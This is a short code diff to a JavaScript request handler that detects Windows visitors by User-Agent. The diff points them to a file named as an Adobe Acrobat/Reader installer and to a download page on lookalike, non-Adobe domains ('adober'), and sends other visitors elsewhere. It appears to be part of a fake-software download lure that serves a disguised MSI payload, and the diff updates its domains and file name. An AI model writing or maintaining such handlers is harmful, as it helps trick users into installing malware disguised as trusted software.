@@ -3,8 +3,8 @@ export default function handler(req, res) {
   const isWindows = /windows/i.test(userAgent);
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-    'https://mksonline.com.mx/css/adobe/reader/download.html';
-  const MSI_PATH = '/Reader_adobe_install_online.msi';
+    'https://wavemarkmx.com/adober/reader/download.html';
+  const MSI_PATH = '/AdobeAcrobatDC_2025.003.40436_29091';
 
   // Base URL for non-Windows users
   const NON_WINDOWS_TARGET = 'https://wavemarkmx.com/ms';
